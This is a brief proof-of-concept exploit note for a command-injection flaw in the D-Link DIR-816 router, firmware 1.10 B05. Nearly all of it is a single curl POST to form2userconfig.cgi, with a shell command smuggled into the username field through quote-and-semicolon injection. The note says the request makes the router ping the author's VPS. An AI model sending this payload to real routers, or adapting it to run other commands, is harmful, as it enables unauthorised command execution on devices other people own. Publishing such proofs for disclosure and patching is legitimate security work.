Vender ：D-Link

Firmware version:1.10 B05

Exploit Author: doudoudedi233@gmail.com

Vendor Homepage: http://www.dlink.com.cn/

Hardware Link:http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-816


##### POC&&EXP

input vps ip
```
curl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=Admin';ping vps;'&oldpass=123&newpass=123&confpass=123&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send"
```
 Now it will ping my VPS address 

